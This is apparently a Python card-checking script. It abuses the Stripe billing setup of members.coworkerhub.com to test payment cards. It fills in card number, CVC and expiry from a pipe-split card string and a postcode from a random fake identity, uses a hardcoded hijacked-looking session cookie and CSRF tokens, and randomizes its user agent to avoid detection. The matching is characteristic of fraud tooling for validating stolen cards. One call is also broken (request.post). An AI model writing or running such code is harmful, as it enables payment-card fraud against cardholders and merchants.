from .util import __extract_str
import requests
import random
import json

def check_coworkerhub(cc, identity):

	try:

		gate_url = "https://members.coworkerhub.com/api/2.2/payments/setup/stripe-card-setup-info"
		gate2_url = "https://api.stripe.com/v1/setup_intents/{}/confirm"
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Mobile DuckDuckGo/5 Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		splitted_card = cc.split("|")

		payment_header = {
			'Host': 'members.coworkerhub.com',
			'Connection': 'keep-alive',
			'Accept': 'application/json, text/plain, */*',
			'X-CSRF-TOKEN': 'a7wJOUYPv16DvaKBURzgEun9bq2Z422dGPAzwBnk',
			'User-Agent': gate_user_agent,
			'X-Requested-With': 'XMLHttpRequest',
			'Sec-Fetch-Site': 'same-origin',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Dest': 'empty',
			'Referer': 'https://members.coworkerhub.com/account/billing/sources',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
			'Cookie': 'UDGFDSDT=a7wJOUYPv16DvaKBURzgEun9bq2Z422dGPAzwBnk; session=TLJJlSrsJ8C3cA9HhJRih5CVZxUiadZqo1f0Nu8V; laravel_token=eyJpdiI6IjAzdUU1WWVRM1BLNU5vZGZwR0dBNXc9PSIsInZhbHVlIjoiV2RqU3NIeG82SnlEQ2d1Y09SZjlsK3Ayc2ljRU9BTHdVOUlhOGROUDJiMzhKekY0WHEzUkdnbFo0OVNwTVdnaVpEYjRMMzBHWnBjRENtanNuNjMxSGJlY2gwNnRzT3UyM2xaOVVrQmZrZEhQSEF1VHZTK3BjbHRQdHJGOUFBTjdXOHQ1NVdFMGRINmpISElkZ1lxcmxVQzRXR1l4a2hheHQ4Q0RRQ2FuckdlY3V1Mm1aU2xrXC9nYXlZcGRIRVpYRXNVUDJva0kzQlN5RHI5MUU3bTZSSDNnY1BYTTZIUU4zRFZucXc4SmtHcFd4RHp1UUx2Sk83ODRZXC9SUGhyTk5TTEFLVXV6K2RzY1ZwMjV2WExYNkJiQT09IiwibWFjIjoiMmE5MTFiZDg3NGY4NWJhYTM3MWRkOTYyNGFmMTM3MTMzM2MwOWM0Mjg4YmViM2MwZWY1ZWFkZjJhOWY1N2U5MCJ9; XSRF-TOKEN=eyJpdiI6ImY4UE9aaCtudFZwUXZ5R2hlQjBtNGc9PSIsInZhbHVlIjoiMmJ2bkZZQVRKVUNcL2UrRDVDXC9od2RBMm1DNExIZ0hlZ2FcL3c4aDEwZkJPYklaNDVURld6RzBYcUFuYjFCNDZ4S3NCejZnZVRcL1wvUk9FMU55SnRyNUpLQT09IiwibWFjIjoiMTJmN2EyNzQ3MWJhY2EyYzgwZDcwMzY1N2IzMzk5MjNkMzVkZGZhYzc1NThlZjM4ZGJjZTQ2NDhjMDFiMTUxNSJ9'
		}

		payment_request = requests.get(gate_url, headers=payment_header)

		if payment_request.status_code < 300:

			cs = __extract_str(payment_request.text, 'stripeCardSetupIntentClientSecret":"', '"')
			id1 = __extract_str(payment_request.text, 'stripeCardSetupIntentClientSecret":"', '_secret')

			payment_header = {
				'Accept': 'application/json',
			    'Accept-language': 'es-ES,es;q=0.9',
			    'Content-type': 'application/x-www-form-urlencoded',
			    'Origin': 'https://js.stripe.com',
			    'Referer': 'https://js.stripe.com/',
			    'Sec-fetch-dest': 'empty',
			    'Sec-fetch-mode': 'cors',
			    'Sec-fetch-site': 'same-site',
			    'User-agent': gate_user_agent
			}

			payment_data = 'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]={}&payment_method_data[card][number]={}&payment_method_data[card][cvc]={}&payment_method_data[card][exp_month]={}&payment_method_data[card][exp_year]={}&payment_method_data[guid]=1cf217de-bc75-4927-831d-7a397b9f6b7f5efd8a&payment_method_data[muid]=6d498f59-4e60-41a5-803b-690c99b437de5c6e81&payment_method_data[sid]=989a385c-4676-4523-a961-5fb2d9a43605ddd5f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F1842adaa6%3B+stripe-js-v3%2F1842adaa6&payment_method_data[time_on_page]=26558&payment_method_data[referrer]=https%3A%2F%2Fmembers.coworkerhub.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_UC724DIiUXCgW6ki788Aj3eD&client_secret={}'.format(identity["results"][0]["location"]["postcode"],
				splitted_card[0],
				splitted_card[3],
				splitted_card[1],
				splitted_card[2],
				cs)

			payment_request = request.post(gate2_url.format(id1), headers=payment_header, data=payment_data)

			if payment_request.status_code < 300:

				return payment_request.json()

			else: return False

		else: return False

	except Exception as E: raise E